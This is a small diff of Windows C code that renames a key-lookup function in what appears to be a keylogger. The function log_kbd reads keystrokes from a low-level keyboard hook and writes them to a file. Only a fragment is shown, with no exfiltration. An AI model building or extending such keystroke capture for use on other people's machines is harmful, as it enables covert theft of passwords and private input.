@@ -16,7 +16,7 @@ errno_t log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 	if (rc)
 		return rc;
 
-	LPCWSTR vk_val = get_key_value(kbd_hook->vkCode);
+	LPCWSTR vk_val = get_virtual_key_value(kbd_hook->vkCode);
 
 	if (vk_val != NULL) {
 		fwprintf_s(out_file, vk_val);
@@ -47,7 +47,7 @@ BOOL is_ignored(DWORD vk_code)
 	}
 }
 
-LPCWSTR get_key_value(DWORD vk_code) 
+LPCWSTR get_virtual_key_value(DWORD vk_code) 
 {
 	switch (vk_code) {
 	case VK_RETURN:
